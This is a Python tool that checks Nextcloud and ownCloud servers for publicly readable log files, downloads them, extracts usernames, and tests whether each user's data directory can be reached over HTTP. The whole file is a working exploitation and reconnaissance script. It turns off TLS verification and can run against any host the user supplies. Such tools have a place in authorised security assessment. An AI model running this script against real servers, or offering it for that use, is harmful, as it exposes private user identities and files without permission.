from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import sys
import requests
import os
import click
import pyperclip
from tqdm import tqdm
from tabulate import tabulate
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

FILE_STORAGE_PATH = '/tmp/lednerb-nextcloud-owncloud.log'

def checkUrlVulnerability(url):
    output = url + ",false"

    try:
        with requests.get(url, stream=True, verify=False, allow_redirects=False, timeout=5) as response:
            if response.status_code == 200:
                for chunk in response.iter_content(chunk_size=16 * 1024, decode_unicode=True):
                    if '"reqId"' in str(chunk):
                        return True, url
    except:
        pass
    
    return False


def downloadLogFile(url):
    with requests.get(url, stream=True, verify=False, allow_redirects=False) as response:
        total_size_in_bytes = int(response.headers.get('content-length', 0))
        progress_bar = tqdm(total=total_size_in_bytes,
                            unit='iB', unit_scale=True, desc="Downloading: ")
        with open(FILE_STORAGE_PATH, 'wb') as file:
            for chunk in response.iter_content(chunk_size=16 * 1024):
                progress_bar.update(len(chunk))
                file.write(chunk)
    progress_bar.close()


def extractUsernames():
    usernames = os.popen('cat ' + FILE_STORAGE_PATH +
                         ' | grep \'"user":\' | awk -F\'"user":"\' \'{print $2}\' | cut -d \'"\' -f 1 | sort -u').read().splitlines()

    try:
        usernames.remove("--")
    except:
        pass

    return usernames

def generateUrls(domain):
    paths = [
        "/data/owncloud.log",
        "/data/nextcloud.log",
        "/nextcloud/data/nextcloud.log",
        "/owncloud/data/owncloud.log"
    ]

    # if domain has no scheme, the urlparse will not work, therefore check and add default scheme
    if '://' not in domain:
        domain = 'http://' + domain

    urls = []
    for path in paths:
        for protocol in ['http://', 'https://']:
            urls.append(protocol + urlparse(domain).netloc + path)
    
    return urls


@click.command()
@click.argument('url')
@click.option('-c', '--clipboard', is_flag=True, default=False, help="Copy usernames to clipboard [only works when run natively]")
@click.option('-o', '--outputPath', help="Write output given directory")
def main(url, clipboard, outputpath):

    vulnUrl = None 

    if ('nextcloud.log' in url) or ('owncloud.log' in url):
        if checkUrlVulnerability(url):
            vulnUrl = url
    else:
        # in this case url is not the full one with the path to the log file
        # therefore try to generate all possible url for the vulnerability
        urls = generateUrls(url)

        for url in urls:
            if checkUrlVulnerability(url):
                vulnUrl = url
                break


    if vulnUrl is None:
        print('URL is not vulnerable')
        exit(0)
    
    print('Vulnerable URL: ' + vulnUrl)

    data = []
    downloadLogFile(vulnUrl)
    usernames = extractUsernames()
    dataDirectory = vulnUrl.rsplit('/', 1)[0]

    for username in usernames:
        accessPossible = False

        response = requests.get(
            dataDirectory + '/' + username + '/', verify=False, allow_redirects=False)
        if response.status_code == 200:
            accessPossible = True

        data.append([username, accessPossible, response.url])

    print()
    print(tabulate(data, headers=[
        "Username", "Data Access Possible", "URL"]))

    if outputpath:
        content = tabulate(data, headers=[
        "Username", "Data Access Possible", "URL"], tablefmt="tsv")
        text_file = open(outputpath + urlparse(vulnUrl).netloc + ".csv", "w")
        text_file.write(content)
        text_file.close()

    if clipboard:
        print('\n\n')
        pyperclip.copy('\n'.join(usernames))
        print("Usernames copied to clipboard!\n")


if __name__ == '__main__':
    main()
